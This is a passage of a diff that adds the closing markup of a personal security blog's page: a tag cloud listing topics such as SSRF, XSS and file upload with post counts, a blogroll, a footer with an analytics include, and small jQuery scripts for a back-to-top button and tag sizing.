+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ssrf" title="ssrf">ssrf</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/thread" title="thread">thread</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/tornado" title="tornado">tornado</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/wireless" title="wireless">wireless</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/xml" title="xml">xml</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/xss" title="xss">xss</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行">代码执行</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" title="反序列化">反序列化</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%90%8e%e9%97%a8" title="后门">后门</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行">命令执行</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" title="操作系统">操作系统</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" title="文件上传">文件上传</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含">文件包含</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%ad%a3%e5%88%99" title="正则">正则</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破">爆破</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发">端口转发</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87" title="网络设备">网络设备</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e8%84%91%e5%9b%be" title="脑图">脑图</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机">虚拟机</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞">逻辑漏洞</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向">重定向</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
+                <sup>1</sup>
+            </p>
+        
+    </div>
+
+
+</div>
+
+            
+<div style="padding-bottom:20px;">
+    <h2 class="asidetitle">Links</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            <a href="http://www.test404.com/" target="_blank">Test404's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <a href="http://zksmile.me/" target="_blank">Zksmile's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <a href="http://www.y-hkl.top/" target="_blank">Y-HKL's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <a href="http://s.yl0.org/" target="_blank">sòng•sec</a>
+        </li>
+    </ul>
+</div>
+        </div>
+    </div>
+</div>
+
+    
+<div class="foot">
+    <div class="copyright">
+        
+        Copyright &copy; 2016-2017 Reber. All Rights Reserved.
+
+        
+        <script type="text/javascript">
+          var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+          document.write(unescape("%3Cspan id='cnzz_stat_icon_1261003390'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s11.cnzz.com/z_stat.php%3Fid%3D1261003390%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));
+        </script>
+    </div>
+    <div class="social">
+        
+        
+            <a href="https://github.com/reber0" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+        
+        &nbsp;&nbsp;
+        
+            <a href="http://weibo.com/u/5819760166" target="_blank"><i class="fa fa-weibo fa-fw"></i>Weibo</a>
+        
+        &nbsp;&nbsp;
+        <a href="http://wyb0.com/index.xml" target="_blank"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </div>
+</div>
+</div>
+
+    
+    <div class="goToTop">
+      <a href="#top" id="goToTop">
+        <img src="http://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部"/>
+      </a>
+    </div>
+    <script type="text/javascript">
+    $.fn.goToTop = function () {
+        if ($(window).scrollTop()<400) {
+            $('#goToTop').hide(); 
+        }
+        $(window).scroll(function () {
+            if ($(this).scrollTop()>400) {
+                $('#goToTop').fadeIn();
+            } else {
+                $('#goToTop').fadeOut();
+            }
+        });
+        this.click(function () {
+            $('html,body').animate({scrollTop:0},800);
+            return false;
+        });
+    }
+    $(document).ready(function () {
+        $('#goToTop').goToTop();
+    });
+    </script>
+
+    
+    <script type="text/javascript">
+    $(document).ready(function(){
+        var alist = $('#tags p');
+        alist.each(function () {
+            var t = $(this);
+            var a = t.find('a');
+            var sup = parseInt(t.find('sup').text());
+            t.find('sup').hide();
+
+            if (0<sup && sup<6) {
+                a.addClass("text7");
+            } else if (5<sup && sup<11) {
+                a.addClass("text6");
+            } else if (10<sup && sup<16) {
+                a.addClass("text5");
+            } else if (15<sup && sup<21) {
+                a.addClass("text4");
+            } else if (20<sup && sup<26) {
+                a.addClass("text3");
+            } else if (25<sup && sup<31) {
+                a.addClass("text2");
+            } else if (30<sup && sup<36) {
+                a.addClass("text1");
+            } else {
+                a.addClass("text1");
+            }
+        });
+    });
+    </script>
+
+    
+    
+
+</body>
+</html>
